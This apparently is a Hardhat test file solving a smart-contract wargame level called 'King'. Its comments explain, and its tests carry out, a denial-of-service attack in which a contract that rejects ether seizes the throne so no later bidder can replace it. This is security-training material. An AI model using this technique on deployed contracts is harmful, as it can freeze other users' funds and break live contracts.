const { expect } = require("chai");
const { ethers } = require("hardhat");

/**

██╗░░██╗██╗███╗░░██╗░██████╗░
██║░██╔╝██║████╗░██║██╔════╝░
█████═╝░██║██╔██╗██║██║░░██╗░
██╔═██╗░██║██║╚████║██║░░╚██╗
██║░╚██╗██║██║░╚███║╚██████╔╝
╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░

 * Goal: 
 * 
 * The contract below represents a very simple game: whoever sends it an amount of ether 
 * that is larger than the current prize becomes the new king. 
 * On such an event, the overthrown king gets paid the new prize, making a bit of ether 
 * in the process! As ponzi as it gets xD.
 * 
 * Solution:
 *
 * Inside the King fallback, there is a king.transfer(), which can fail if the current 
 * king is a malicious contract and refuses to withdraw. 
 * The solution is to create a new contract with malicious fallback so that it cannot 
 * receive any amount of ether, become the new King sending the right amount and the 
 * game is done, the next callers could never become the new king, because the current
 * one cannot withdraw via malicious fallback the ether deposited.
 * 
 * Note:
 * 
 * Keep warning when create a malicious contract because we need to cover the right amount
 * to become the new king.
 * Tip --> make a rescue withdraw or selfdestruct function to return the funds if the balance 
 * is not corrected or enough to become the new king.
 * 
 */
describe("King", function () {
    let king, kingAttacker, owner, player, initialPrize;

    before(async function () {
        [owner, player, unknow] = await ethers.getSigners();
        initialPrize = ethers.utils.parseEther("1");

        const King = await ethers.getContractFactory("contracts/King/King.sol:King");
        king = await King.connect(owner).deploy({ value: initialPrize });

        const KingAttacker = await ethers.getContractFactory("contracts/King/KingAttacker.sol:KingAttacker");
        kingAttacker = await KingAttacker.connect(player).deploy(king.address, { value: initialPrize });
    });

    describe("Broke the contract", async function () {
        it("Should state that the deployer is the current king", async function () {
            expect(await king.connect(player)._king()).to.be.eq(owner.address); // in this case: 1st king == owner == deployer
        });

        it("Should state that malicious contract has enough ether to become the new king", async function () {
            expect(await ethers.provider.getBalance(kingAttacker.address)).to.be.eq(initialPrize);
        });

        it("Should state that the malicious contract is the new king", async function () {
            await kingAttacker.connect(player).becomeKing(); // malicious contract become the King

            expect(await king.connect(player)._king()).to.be.eq(kingAttacker.address); // kingAttacker is the new king
        });

        it("Should revert the trx because the current king does not accept any ether", async function () {
            // unknow wallet try to become the new king sending 2 ether (> of current) but..
            // the kingAttacker (current king) does not accept any ether. King contract has been broken!
            await expect(unknow.sendTransaction({ to: king.address, value: ethers.utils.parseEther("2"), gasLimit: 100000 })).to.be.revertedWith(
                "the current king does not accept ether!"
            );
        });
    });
});
